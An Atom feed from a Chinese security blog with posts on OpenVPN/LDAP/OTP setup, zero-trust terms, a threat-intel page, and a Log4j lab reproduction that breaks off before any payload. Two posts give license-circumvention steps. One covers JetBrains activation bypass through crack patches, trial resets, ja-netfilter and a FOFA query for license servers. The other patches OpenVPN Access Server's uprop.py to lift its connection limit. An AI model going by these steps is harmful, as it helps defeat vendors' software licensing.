<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="http://www.pa55w0rd.online/atom.xml" rel="self"/>
  
  <link href="http://www.pa55w0rd.online/"/>
  <updated>2022-03-17T03:42:08.882Z</updated>
  <id>http://www.pa55w0rd.online/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>jetbrains产品免费食用方法-_-</title>
    <link href="http://www.pa55w0rd.online/jetbrains-use/"/>
    <id>http://www.pa55w0rd.online/jetbrains-use/</id>
    <published>2022-03-17T02:35:30.000Z</published>
    <updated>2022-03-17T03:42:08.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>jetbrains的产品大家都不是很陌生，我自己就用过IDEA、PyCharm、PhpStorm、GoLand这几款，专业版首次使用会有30天试用，本着有破解的就不用社区的，有最新版就不用旧版的原则，从网上找到了一些破解方法</p><span id="more"></span><h2 id="0x01-破解补丁"><a href="#0x01-破解补丁" class="headerlink" title="0x01 破解补丁"></a>0x01 破解补丁</h2><p>通过搜多引擎能搜索到很多破解补丁，如果版本升级了，破解补丁就不能用了，需要重新找对应版本的破解补丁</p><h2 id="0x02-教育邮箱免费注册使用"><a href="#0x02-教育邮箱免费注册使用" class="headerlink" title="0x02 教育邮箱免费注册使用"></a>0x02 教育邮箱免费注册使用</h2><p>使用教育邮箱免费注册使用，一年一续，之前使用的是马建军大学的免费教育邮箱注册jetbrains，这个邮箱已经被jb拉黑，不算免费使用了，不清楚现在是否还可以使用</p><h2 id="0x03-重置试用"><a href="#0x03-重置试用" class="headerlink" title="0x03 重置试用"></a>0x03 重置试用</h2><p>参考大佬 <a href="https://zhile.io/2020/11/18/jetbrains-eval-reset-deprecated.html">Jetbrains系列产品重置试用方法</a> ，安装一个插件，配置好，每次重启idea都会重置使用，使用还是很简单，版本升级了也是可以用的，知道2021.3版本发现就不能重置了</p><h2 id="0x04-ja-netfilter"><a href="#0x04-ja-netfilter" class="headerlink" title="0x04 ja-netfilter"></a>0x04 ja-netfilter</h2><p>重置试用方法不好用了之后，去大佬blog发现有新的免费使用方法了，<a href="https://zhile.io/2021/11/29/ja-netfilter-javaagent-lib.html">介绍一个”牛逼闪闪”开源库：ja-netfilter</a>，一个基于javeagent的防火墙，阻止访问在线激活地址</p><h2 id="0x05-激活服务器"><a href="#0x05-激活服务器" class="headerlink" title="0x05 激活服务器"></a>0x05 激活服务器</h2><p>参考<a href="https://mp.weixin.qq.com/s/fWVixt8DCrHkAH8Pbfg3NA">【日常分享】- IDEA-JetBrains全系列产品授权</a>，方法，通过fofa寻找激活服务器，</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fofa语法：</span><br><span class="line"><span class="attribute">header</span>=<span class="string">&quot;https://account.jetbrains.com/fls-auth&quot;</span>  </span><br></pre></td></tr></table></figure><p>随便找一个，激活成功</p><p><img src="https://pic.rmb.bdstatic.com/bjh/9c296d4c1d4501afa126bc0497ef2ed0.png" alt="1647485921(1).png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;jetbrains的产品大家都不是很陌生，我自己就用过IDEA、PyCharm、PhpStorm、GoLand这几款，专业版首次使用会有30天试用，本着有破解的就不用社区的，有最新版就不用旧版的原则，从网上找到了一些破解方法&lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="工具使用" scheme="http://www.pa55w0rd.online/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>SPA &amp; fwknop &amp; SDP &amp; Pomerium &amp; IAP &amp; Traefik &amp; KeyCloak &amp; Casbin &amp; ORY Oathkeeper</title>
    <link href="http://www.pa55w0rd.online/zer-trust-security-model/"/>
    <id>http://www.pa55w0rd.online/zer-trust-security-model/</id>
    <published>2022-03-10T05:49:02.000Z</published>
    <updated>2022-03-10T09:01:55.370Z</updated>
    
    <content type="html"><![CDATA[<p>远程办公的场景越来越多，传统的VPN方式已经不能满足业务和安全需求，这里先记录几个名词，后续有时间研究研究</p><p><code>SPA &amp; fwknop &amp; SDP &amp; Pomerium &amp; IAP &amp; Traefik &amp; KeyCloak &amp; Casbin &amp; ORY Oathkeeper</code></p><p>留坑</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;远程办公的场景越来越多，传统的VPN方式已经不能满足业务和安全需求，这里先记录几个名词，后续有时间研究研究&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SPA &amp;amp; fwknop &amp;amp; SDP &amp;amp; Pomerium &amp;amp; IAP &amp;amp; Traefik &amp;amp; KeyCloak &amp;amp; Casbin &amp;amp; ORY Oathkeeper&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;留坑&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="零信任" scheme="http://www.pa55w0rd.online/tags/%E9%9B%B6%E4%BF%A1%E4%BB%BB/"/>
    
    <category term="zero-trust" scheme="http://www.pa55w0rd.online/tags/zero-trust/"/>
    
    <category term="iam" scheme="http://www.pa55w0rd.online/tags/iam/"/>
    
  </entry>
  
  <entry>
    <title>OpenVPN + Ldap + OTP</title>
    <link href="http://www.pa55w0rd.online/openvpn/"/>
    <id>http://www.pa55w0rd.online/openvpn/</id>
    <published>2022-03-03T09:55:02.000Z</published>
    <updated>2022-03-03T10:47:02.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OpenVPN-服务端的一些配置"><a href="#OpenVPN-服务端的一些配置" class="headerlink" title="OpenVPN 服务端的一些配置"></a>OpenVPN 服务端的一些配置</h1><p>VPN是企业内比较重要的一个资产，不能从网上乱下载，去官网看看 <a href="https://openvpn.net/%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8D%E6%87%82%E4%BA%8B%EF%BC%8C%E4%B8%8D%E6%B8%85%E6%A5%9AOpenVPN%E8%BF%98%E6%9C%89%E5%95%86%E4%B8%9A%E7%89%88%EF%BC%8COpenVPN">https://openvpn.net/，第一次不懂事，不清楚OpenVPN还有商业版，OpenVPN</a> Access Server 和 OpenVPN Community，直接就安装了OpenVPN AS，没有网上说的那么难，还有图形化界面，登陆进行发现2个并发license？？？去官网注册购买需要花钱？？？</p><span id="more"></span><h1 id="AS-版本破解"><a href="#AS-版本破解" class="headerlink" title="AS 版本破解"></a>AS 版本破解</h1><p>下载的最新版本的2.10.1，从网上搜了一下，这玩意还有破解版的，试一下最新版能不能破解</p><p>参考<a href="https://6xyun.cn/article/112">《XX Access Server 2.9.x 破解在线人数限制》</a>，这是找到的最新的了，发现使用相同的办法，也能破解2.10.1</p><p>待破解的文件仍是 pyovpn-2.0-py3.6.egg，解压，反编译pyovpn/lic/uprop.pyc </p><p>修改uprop.py，搜索return ret，在上面添加一行<code>ret[&#39;concurrent_connections&#39;] = 4096</code></p><p>编译，替换 </p><p>初始化AS<br>/usr/local/openvpn_as/bin/ovpn-init</p><p>配置VPN 路由、LDAP 、MFA，真丝滑</p><h1 id="社区版OpenVPN"><a href="#社区版OpenVPN" class="headerlink" title="社区版OpenVPN"></a>社区版OpenVPN</h1><p>从官网上找教程</p><p>部署参考<a href="https://www.xxlaila.cn/2020/03/10/openvpn%E9%83%A8%E7%BD%B2/">《openvpn部署》</a></p><p>server端配置文件 /etc/openvpn/server.conf</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">port</span> <span class="number">1194</span>   <span class="comment"># 监听的端口号</span></span><br><span class="line"><span class="string">proto</span> <span class="string">udp</span>   <span class="comment"># 服务端用的协议，udp,默认udp</span></span><br><span class="line"><span class="string">dev</span> <span class="string">tun</span></span><br><span class="line"><span class="string">ca</span> <span class="string">/etc/openvpn/server/certs/ca.crt</span>  <span class="comment">#   CA 根证书路径</span></span><br><span class="line"><span class="string">cert</span> <span class="string">/etc/openvpn/server/certs/server.crt</span>  <span class="comment"># open VPN 服务器证书路径</span></span><br><span class="line"><span class="string">key</span> <span class="string">/etc/openvpn/server/certs/server.key</span>  <span class="comment"># open VPN 服务器密钥路径，This file should be kept secret</span></span><br><span class="line"><span class="string">dh</span> <span class="string">/etc/openvpn/server/certs/dh.pem</span>  <span class="comment"># Diffie-Hellman 算法密钥文件路径</span></span><br><span class="line"><span class="string">tls-auth</span> <span class="string">/etc/openvpn/server/certs/ta.key</span> <span class="number">0</span> <span class="comment"># 开启TLS-auth，使用ta.key防御攻击。服务器端的第二个参数值为0，客户端的为1。</span></span><br><span class="line"><span class="string">ifconfig-pool-persist</span> <span class="string">ipp.txt</span> <span class="comment">#服务器自动给客户端分配IP后，客户端下次连接时，仍然采用上次的IP地址(第一次分配的IP保存在ipp.txt中，下一次分配其中保存的IP)。</span></span><br><span class="line"><span class="string">push</span> <span class="string">&quot;route 10.0.0.0 255.0.0.0&quot;</span>   <span class="comment"># # 推送路由和DNS到客户端</span></span><br><span class="line"><span class="string">push</span> <span class="string">&quot;route 192.168.0.0 255.255.0.0&quot;</span></span><br><span class="line"><span class="string">push</span> <span class="string">&quot;route 172.16.0.0 255.240.0.0&quot;</span>  <span class="comment"># 推送路由到客户端，如果内网服务器地址是172.21.16.0的网段，可以增加此行，然后就可以ping通内网地址的所有服务器</span></span><br><span class="line"><span class="string">server</span> <span class="number">10.8</span><span class="number">.0</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>   <span class="comment"># 该网段为 open VPN 虚拟网卡网段，不要和内网网段冲突即可。open VPN 默认为 10.8.0.0/24</span></span><br><span class="line"><span class="string">push</span> <span class="string">&quot;dhcp-option DNS 8.8.8.8&quot;</span>  <span class="comment"># DNS 服务器配置，可以根据需要指定其他 ns</span></span><br><span class="line"><span class="string">push</span> <span class="string">&quot;dhcp-option DNS 8.8.4.4&quot;</span></span><br><span class="line"><span class="comment"># push &quot;redirect-gateway def1&quot;   # 客户端所有流量都通过 open VPN 转发，类似于代理开全局，VPN服务器本身要通过客户端原来的网关访问(取消redirect-gateway def1 bypass-dhcp选项后这项必须开启，否则无法访问OpenVPN服务器)</span></span><br><span class="line"><span class="string">compress</span> <span class="string">lzo</span></span><br><span class="line"><span class="string">duplicate-cn</span>   <span class="comment"># 如果客户端都使用相同的证书和密钥连接VPN，一定要打开这个选项，否则每个证书只允许一个人连接VPN</span></span><br><span class="line"><span class="string">keepalive</span> <span class="number">10</span> <span class="number">120</span>  <span class="comment"># 每10秒ping一次，连接超时时间设为120秒。</span></span><br><span class="line"><span class="string">comp-lzo</span>  <span class="comment"># 开启VPN连接压缩，如果服务器端开启，客户端也必须开启</span></span><br><span class="line"><span class="string">client-to-client</span> <span class="comment">#设置客户端是否可以访问客户端</span></span><br><span class="line"><span class="string">persist-key</span> <span class="comment"># 持久化选项可以尽量避免访问在重启时由于用户权限降低而无法访问的某些资源。</span></span><br><span class="line"><span class="string">persist-tun</span></span><br><span class="line"><span class="string">max-clients</span> <span class="number">1000</span> <span class="comment"># 允许最大的客户端连接数，默认100</span></span><br><span class="line"><span class="string">user</span> <span class="string">openvpn</span>  <span class="comment"># open VPN 进程启动用户，openvpn 用户在安装完 openvpn 后就自动生成了</span></span><br><span class="line"><span class="string">group</span> <span class="string">openvpn</span></span><br><span class="line"><span class="string">log</span> <span class="string">/var/log/openvpn/server.log</span>  <span class="comment"># 指定 log 文件位置</span></span><br><span class="line"><span class="string">log-append</span> <span class="string">/var/log/openvpn/server.log</span></span><br><span class="line"><span class="string">status</span> <span class="string">/var/log/openvpn/status.log</span></span><br><span class="line"><span class="string">verb</span> <span class="number">3</span></span><br><span class="line"><span class="string">explicit-exit-notify</span> <span class="number">1</span>  <span class="comment"># 设置断线重连功能</span></span><br><span class="line"><span class="string">cipher</span> <span class="string">AES-256-CBC</span>    <span class="comment">#指定数据对称加密算法</span></span><br><span class="line"><span class="string">reneg-sec</span> <span class="number">0</span>   <span class="comment">#reneg-sec服务器端会定期检查认证情况，默认3600秒一小时，使用OTP的话尽量时间长一些，否则客户端需要重新输入用户名密码和OTP一次性密码。</span></span><br><span class="line"><span class="string">auth-nocache</span>  <span class="comment">#断线后防止内存中保存用户名和密码来提高安全性</span></span><br></pre></td></tr></table></figure><p>防火墙相关配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 openvpn 的网络流量转发到公网：snat 规则</span></span><br><span class="line"><span class="string">iptables</span> <span class="string">-t</span> <span class="string">nat</span> <span class="string">-A</span> <span class="string">POSTROUTING</span> <span class="string">-s</span> <span class="number">10.8</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span> <span class="string">-j</span> <span class="string">MASQUERADE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables 规则持久化保存</span></span><br><span class="line"><span class="string">iptables-save</span> <span class="string">&gt;</span> <span class="string">/etc/sysconfig/iptables</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 规则查看</span></span><br><span class="line"><span class="string">iptables</span> <span class="string">-nvL</span> <span class="string">-t</span> <span class="string">nat</span></span><br></pre></td></tr></table></figure><p>客户端配置文件 config.ovpn</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">client</span></span><br><span class="line"><span class="string">proto</span> <span class="string">udp</span></span><br><span class="line"><span class="string">dev</span> <span class="string">tun</span></span><br><span class="line"><span class="string">remote</span> [<span class="string">open</span> <span class="string">VPN服务端公网</span> <span class="string">ip，根据实际情况填写</span>] <span class="number">1194</span>  <span class="string">//openvpn服务器的外网IP和端口(可以写多个做到高可用)</span></span><br><span class="line"><span class="string">ca</span> <span class="string">ca.crt</span></span><br><span class="line"><span class="string">cert</span> <span class="string">admin.crt</span></span><br><span class="line"><span class="string">key</span> <span class="string">admin.key</span></span><br><span class="line"><span class="string">tls-auth</span> <span class="string">ta.key</span> <span class="number">1</span></span><br><span class="line"><span class="string">remote-cert-tls</span> <span class="string">server</span>  <span class="string">//指定采用服务器校验方式</span></span><br><span class="line"><span class="string">comp-lzo</span></span><br><span class="line"><span class="string">verb</span> <span class="number">3</span>     <span class="string">//调试信息级别</span></span><br><span class="line"><span class="string">mute-replay-warnings</span></span><br><span class="line"><span class="string">resolv-retry</span> <span class="string">infinite</span>    <span class="string">//断线自动重新连接</span></span><br><span class="line"><span class="string">nobind</span>    <span class="string">//不绑定特定的本地端口号</span></span><br><span class="line"><span class="string">persist-key</span>    <span class="string">//与服务器端的保持一致</span></span><br><span class="line"><span class="string">persist-tun</span>    <span class="string">//与服务器端的保持一致</span></span><br><span class="line"><span class="string">cipher</span> <span class="string">AES-256-CBC</span>    <span class="string">//指定数据对称加密算法</span></span><br></pre></td></tr></table></figure><h1 id="配置LDAP"><a href="#配置LDAP" class="headerlink" title="配置LDAP"></a>配置LDAP</h1><p>这里参考<a href="https://www.xxlaila.cn/2020/03/11/openvpn%E9%85%8D%E7%BD%AEldap/">《openvpn配置ldap》</a></p><p>LDAP接入还是很省事的，安装openvpn-auth-ldap插件</p><p>配置 /etc/openvpn/auth/ldap.conf</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;LDAP&gt;</span></span><br><span class="line"><span class="string">URL</span><span class="string">ldap://xx.xx.xx.xx:389</span></span><br><span class="line">    <span class="string">Password</span><span class="string">xx</span></span><br><span class="line"><span class="string">Timeout</span><span class="number">15</span></span><br><span class="line"><span class="string">TLSEnable</span><span class="literal">no</span></span><br><span class="line"><span class="string">FollowReferrals</span> <span class="literal">no</span></span><br><span class="line"><span class="string">&lt;/LDAP&gt;</span></span><br><span class="line"><span class="string">&lt;Authorization&gt;</span></span><br><span class="line"><span class="string">BaseDN</span><span class="string">&quot;ou=xx,dc=xx,dc=cn&quot;</span></span><br><span class="line"><span class="string">SearchFilter</span><span class="string">&quot;sAMAccountName=%u&quot;</span></span><br><span class="line"><span class="string">RequireGroup</span><span class="literal">false</span></span><br><span class="line"><span class="string">&lt;/Authorization&gt;</span></span><br></pre></td></tr></table></figure><p>编辑server配置文件，添加</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">plugin</span> <span class="string">/usr/lib64/openvpn/plugin/lib/openvpn-auth-ldap.so</span> <span class="string">&quot;/etc/openvpn/auth/ldap.conf&quot;</span></span><br><span class="line"><span class="string">client-cert-not-required</span></span><br><span class="line"><span class="string">username-as-common-name</span></span><br></pre></td></tr></table></figure><p>修改客户端配置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ns-cert-<span class="keyword">type</span> <span class="keyword">server</span></span><br><span class="line">auth-<span class="keyword">user</span>-pass     </span><br></pre></td></tr></table></figure><p>测试成功</p><h1 id="配置OTP"><a href="#配置OTP" class="headerlink" title="配置OTP"></a>配置OTP</h1><p>这个有点难啊，一直没有配置成功<br>参考<a href="https://www.ipcpu.com/2019/04/openvpn-googleauthenticator/">《OpenVPN启用LDAP+GoogleAuthenticator认证》</a>，<br>使用了<a href="https://github.com/evgeny-gridasov/openvpn-otp%E6%8F%92%E4%BB%B6%EF%BC%8C%E4%B8%80%E7%9B%B4%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%94%BE%E5%BC%83%E4%BA%86">https://github.com/evgeny-gridasov/openvpn-otp插件，一直没有成功，放弃了</a></p><p>参考<a href="https://blog.51cto.com/windyma/1967176">《OpenVPN+AD+Google authenticator 安装、配置》</a>，使用了google-authenticator-libpam，不是专业运维，配置pam头疼，放弃了</p><p>继续搜索可用教程<br>找到了<a href="https://github.com/wheelybird/openvpn-server-ldap-otp%EF%BC%8C%E9%80%9A%E8%BF%87docker%E9%83%A8%E7%BD%B2%EF%BC%8C%E9%9B%86%E6%88%90%E5%A5%BD%E4%BA%86ldap%E5%92%8Cotp%EF%BC%8C%E4%B8%9D%E6%BB%91%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9C%8B%E4%BA%86%E4%B8%8B%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%EF%BC%8C%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8">https://github.com/wheelybird/openvpn-server-ldap-otp，通过docker部署，集成好了ldap和otp，丝滑，简单看了下配置参数，启动容器</a></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">\</span></span><br><span class="line">           <span class="string">--name</span> <span class="string">openvpn</span> <span class="string">\</span></span><br><span class="line">           <span class="string">--volume</span> <span class="string">/etc/openvpn:/etc/openvpn</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-v</span> <span class="string">/etc/localtime:/etc/localtime:ro</span> <span class="string">\</span></span><br><span class="line">           <span class="string">--detach=true</span> <span class="string">\</span></span><br><span class="line">           <span class="string">--restart=always</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-p</span> <span class="number">61194</span><span class="string">:1194/udp</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;OVPN_SERVER_CN=vpn.pa55w0rd.com&quot;</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;LDAP_URI=ldap://xx.xx.xx.xx&quot;</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;LDAP_BASE_DN=OU=xx,DC=xx&quot;</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;LDAP_BIND_USER_DN=CN=xx,OU=xx,DC=xx&quot;</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;LDAP_BIND_USER_PASS=xx&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;LDAP_LOGIN_ATTRIBUTE=sAMAccountName&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;LDAP_FILTER=(objectClass=user)&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;OVPN_NETWORK=10.118.0.0 255.255.0.0&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;OVPN_ROUTES=172.16.0.0 255.240.0.0,10.0.0.0 255.0.0.0,192.168.0.0 255.255.0.0&quot;</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;OVPN_DNS_SERVERS=192.168.1.2&quot;</span> <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;OVPN_IDLE_TIMEOUT=36000&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;ENABLE_OTP=true&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;FAIL2BAN_ENABLED=true&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">-e</span> <span class="string">&quot;FAIL2BAN_MAXRETRIES=20&quot;</span>  <span class="string">\</span></span><br><span class="line">           <span class="string">--cap-add=NET_ADMIN</span> <span class="string">\</span></span><br><span class="line">           <span class="string">wheelybird/openvpn-ldap-otp:v1.5</span></span><br></pre></td></tr></table></figure><p>打印客户端配置文件<code> docker exec -ti openvpn show-client-config</code></p><p>添加OTP <code>docker exec -ti openvpn add-otp-user &lt;username&gt;</code> where username matches the LDAP username.</p><p>还有fail2ban防止暴力破解</p><p>测试，登陆成功</p><h1 id="客户端连接VPN"><a href="#客户端连接VPN" class="headerlink" title="客户端连接VPN"></a>客户端连接VPN</h1><p>偷懒，阿里云都写好了 <a href="https://help.aliyun.com/document_detail/65075.html">《客户端远程连接VPC》</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;OpenVPN-服务端的一些配置&quot;&gt;&lt;a href=&quot;#OpenVPN-服务端的一些配置&quot; class=&quot;headerlink&quot; title=&quot;OpenVPN 服务端的一些配置&quot;&gt;&lt;/a&gt;OpenVPN 服务端的一些配置&lt;/h1&gt;&lt;p&gt;VPN是企业内比较重要的一个资产，不能从网上乱下载，去官网看看 &lt;a href=&quot;https://openvpn.net/%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8D%E6%87%82%E4%BA%8B%EF%BC%8C%E4%B8%8D%E6%B8%85%E6%A5%9AOpenVPN%E8%BF%98%E6%9C%89%E5%95%86%E4%B8%9A%E7%89%88%EF%BC%8COpenVPN&quot;&gt;https://openvpn.net/，第一次不懂事，不清楚OpenVPN还有商业版，OpenVPN&lt;/a&gt; Access Server 和 OpenVPN Community，直接就安装了OpenVPN AS，没有网上说的那么难，还有图形化界面，登陆进行发现2个并发license？？？去官网注册购买需要花钱？？？&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="安全防护" scheme="http://www.pa55w0rd.online/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>博客添加威胁情报播报模块</title>
    <link href="http://www.pa55w0rd.online/threat-broadcast-post/"/>
    <id>http://www.pa55w0rd.online/threat-broadcast-post/</id>
    <published>2021-12-24T05:47:09.000Z</published>
    <updated>2022-03-02T08:59:31.596Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞威胁情报，通过公开的威胁情报来源爬取并整合最新信息</p><p>clone项目地址：<a href="https://github.com/lyy289065406/threat-broadcast">https://github.com/lyy289065406/threat-broadcast</a></p><p>通过Github Actions部署，并自动生成 Github Page 播报页面</p><span id="more"></span><p>博客地址：<a href="https://www.pa55w0rd.online/">https://www.pa55w0rd.online/</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/5ece22d6a1c6cf4a553034ddbc64cb4d.png" alt="image.png"></p><p>Github Page </p><p><img src="https://pic.rmb.bdstatic.com/bjh/7b9b8040329a4679f744c9cf59e8d71a.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;漏洞威胁情报，通过公开的威胁情报来源爬取并整合最新信息&lt;/p&gt;
&lt;p&gt;clone项目地址：&lt;a href=&quot;https://github.com/lyy289065406/threat-broadcast&quot;&gt;https://github.com/lyy289065406/threat-broadcast&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过Github Actions部署，并自动生成 Github Page 播报页面&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="威胁情报" scheme="http://www.pa55w0rd.online/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Log4j CVE-2021-45046 复现</title>
    <link href="http://www.pa55w0rd.online/log4j/"/>
    <id>http://www.pa55w0rd.online/log4j/</id>
    <published>2021-12-17T08:33:07.000Z</published>
    <updated>2021-12-17T10:24:59.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p><span id="more"></span><p>上面从网上找了一段描述，自上周四poc出来之后，波及很广，大家都是加班加点的打补丁，很多SRC纷纷发文称暂不接受该漏洞，到现在，仍有很多带有漏洞的业务跑在互联网上，利用工具如雨后春笋一样，这里随便找了个工具从黑盒层面进行检测，该漏洞的利用方式类似fastjson jndi注入</p><h2 id="黑盒检测工具"><a href="#黑盒检测工具" class="headerlink" title="黑盒检测工具"></a>黑盒检测工具</h2><p>这里推荐burp插件进行被动扫描，之前尝试写xray poc，发现xray的poc只能fuzz header头，不能遍历参数进行fuzz，burp插件覆盖更全面</p><p>自行GitHub搜索 log4jscan</p><p>dnslog建议自建或者使用ceye.io，不然大家都是用dnslog.cn，时不时抽风一下，根本无法检测出漏洞</p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p><p>执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p><p><img src="https://pic.rmb.bdstatic.com/bjh/bd2dcbe7957c7bf340c04dcaa20a749d.png" alt="image.png"></p><p>使用浏览器访问：<br><a href="http://192.168.64.128:8983/solr/#/">http://192.168.64.128:8983/solr/#/</a></p><h2 id="漏洞检测"><a 